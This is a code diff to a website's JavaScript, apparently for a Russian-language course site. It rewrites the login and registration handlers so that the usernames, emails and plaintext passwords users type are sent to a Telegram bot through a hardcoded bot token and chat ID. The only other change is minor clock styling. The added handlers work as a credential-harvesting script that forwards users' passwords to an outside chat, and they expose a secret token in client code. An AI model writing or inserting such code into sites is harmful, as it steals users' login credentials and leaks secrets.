@@ -95,21 +95,79 @@ buttonToTop.addEventListener('click' , e => {
   window.scrollTo({ top: 0, behavior: "smooth" });
 })
 
-function reg() {
-  alert("Вы успешно зарегестрировались!");
-  closeReg();
-  closePopup();
-}
-
 function review() {
   alert("Ваш отзыв принят на рассмотрение!");
 }
 
+const botToken = '7646796544:AAG2VPfA7aw3rqLowLLCG5NaYpnfNbdhoR0';
+const chatId = '1074140202';
+
+// Функция для отправки сообщения
+function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            alert('Данные успешно отправлены!');
+        } else {
+            alert('Ошибка при отправке: ' + data.description);
+        }
+    })
+    .catch(error => {
+        alert('Ошибка сети: ' + error);
+    });
+}
+
+// Обработчик для входа
 function avtor() {
-  alert("Вы успешно вошли в свой аккаунт!");
-  closeAvtor();
-  closePopup();
-  img = document.querySelector('.guest').src = 'image/user.png';
+    const login = document.getElementById('login').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    // Можно добавить проверку
+    if (!login || !password) {
+        alert('Пожалуйста, заполните все поля');
+        return;
+    }
+
+    const message = `<b>Вход:</b>\nЛогин: ${login}\nПароль: ${password}`;
+    sendToTelegram(message);
+}
+
+// Обработчик для регистрации
+function reg() {
+    const username = document.getElementById('reg_username').value.trim();
+    const email = document.getElementById('reg_email').value.trim();
+    const password = document.getElementById('reg_password').value.trim();
+    const confirmPassword = document.getElementById('reg_confirm_password').value.trim();
+
+    // Проверки
+    if (!username || !email || !password || !confirmPassword) {
+        alert('Пожалуйста, заполните все поля');
+        return;
+    }
+    if (password !== confirmPassword) {
+        alert('Пароли не совпадают');
+        return;
+    }
+    // Простая проверка email
+    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailPattern.test(email)) {
+        alert('Введите корректный email');
+        return;
+    }
+
+    const message = `<b>Регистрация:</b>\nИмя пользователя: ${username}\nEmail: ${email}\nПароль: ${password}`;
+    sendToTelegram(message);
 }
 
 const button = document.querySelector('.courses');
@@ -196,6 +254,8 @@ function startClock() {
   clock.style.right = '5%';
   clock.style.color = 'white';
   clock.style.fontSize = '12pt';
+  clock.style.width = '10%';
+  clock.style.minWidth = '120px';
   document.body.appendChild(clock);
 
   function updateClock() {
